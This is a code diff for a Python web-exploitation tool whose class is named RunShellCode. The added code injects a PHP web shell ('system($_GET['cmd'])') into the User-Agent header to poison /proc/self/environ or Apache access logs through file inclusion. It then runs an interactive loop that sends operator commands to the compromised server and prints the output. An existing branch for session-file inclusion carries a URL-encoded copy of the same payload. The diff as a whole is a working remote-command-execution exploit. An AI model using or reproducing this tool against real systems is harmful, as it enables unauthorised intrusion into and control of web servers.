@@ -16,6 +16,8 @@ O = '\33[37m'
 B = '\033[34m'    
 P = '\033[35m'   
 Y = '\033[1;33m' 
+import shutil
+
 
 WebBanner =O +"""  
             ,   .     .    ,-.  .       . . 
@@ -46,14 +48,14 @@ class RunShellCode:
                 pass
         try :            
            self.WebControl()
+           
         except Exception as go :
             print(go) 
             time.sleep(10) 
 
     def WebControl(self,**kwargs):
-        
-        while True:
-            try:
+        if 'sess_' in self.url:
+             while True:
                 inputsuer = input(R+"Your_request :  "+W)
                 request = mechanize.Browser()
                 WebShell = "%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E"
@@ -89,10 +91,56 @@ class RunShellCode:
                        print("\t\t"+l.replace('\n',''))           
                 if os.path.exists ("./Package/shell/.data")  :
                    os.remove("./Package/shell/.data")  
-            except Exception as s :
-                print(s)
-                time.sleep(10)     
-         
+        elif "proc/self/environ" in self.url \
+        or "/var/log/apache2/access.log" in self.url  :
+            request = mechanize.Browser()
+            paylaodPHP = "<?php system($_GET['cmd']); ?>"  
+            request.addheaders = [('User-agent', 'Mozilla/5.0'+paylaodPHP+'(X11; U; Linux i686; en-US; rv:1.9.0.1))\
+                                   Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+                                  ('Cookie',str(self.Cookie).replace('\n',''))]
+            with open("./Package/shell/.repones.txt",'w') as repones:
+                repones = repones.write(str(request.open(self.url).read()))                      
+            while True :
+                inputsuer = input(R+"Your_request :  "+W)
+                request = mechanize.Browser()
+                command = self.url+'&cmd='+inputsuer 
+                with open("./Package/shell/.repones2.txt",'w') as repones2:
+                    repones2 = repones2.write(str(request.open(command ).read()))     
+                with open("./Package/shell/.repones.txt",'r') as f:
+                     file1_lines = f.read().split("\\n")
+                with open("./Package/shell/.repones2.txt",'r') as Rqreder:
+                    file2_lines = Rqreder.read().split("\\n")  
+                DataList = []    
+                diff = difflib.unified_diff(file1_lines, file2_lines, fromfile='.repones2.txt', tofile='.repones1.txt', lineterm='')
+                for line in diff:
+                    if line.startswith('+') and not line.startswith('+++') and not line.startswith('++'):
+                        line= "".join(line.replace("Mozilla/5.0",'\n'))
+                        cleaned_content = line[1:]   
+                        cleaned_content = re.sub(r'\s+\n', '\n', cleaned_content)  # Remove extra blank lines
+                        cleaned_content = re.sub(r'\+\s+', '', cleaned_content)  
+                        cleaned_content = re.sub( r'^.*\b\w+\d+:.*', '', cleaned_content)
+                        cleaned_text = re.sub(r'^\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b','' , cleaned_content)
+                        cleaned_content = re.sub(r'";preference\|s:\d+:"[^"]*";', '', cleaned_content)
+                        cleaned_content= re.sub(r'(X11.*?Firefox/.*?")', '',cleaned_content)
+                        cleaned_content  = re.sub(r'\s+', ' ', cleaned_content)
+                        
+                        with open("./Package/shell/.data",'w') as data:
+                            data = data.write(cleaned_content)
+                        with open("./Package/shell/.data",'r') as data: 
+                           data = data.read().split("\n")
+                           for line in data:
+                                if line in DataList:
+                                  pass
+                                else:
+                                    DataList.append(line)
+
+                print(Y+"web_repones  : "+W + DataList[0].replace('\n','').replace('(',''))
+                for l in DataList[1:] :
+                      print("\t\t"+l.replace('\n','').replace('(',''))           
+                if os.path.exists ("./Package/shell/.data")  :
+                   os.remove("./Package/shell/.data")
+                shutil.copyfile("./Package/shell/.repones2.txt", "./Package/shell/.repones.txt")
+
 if __name__=='__main__':
     try:
        RunShellCode()
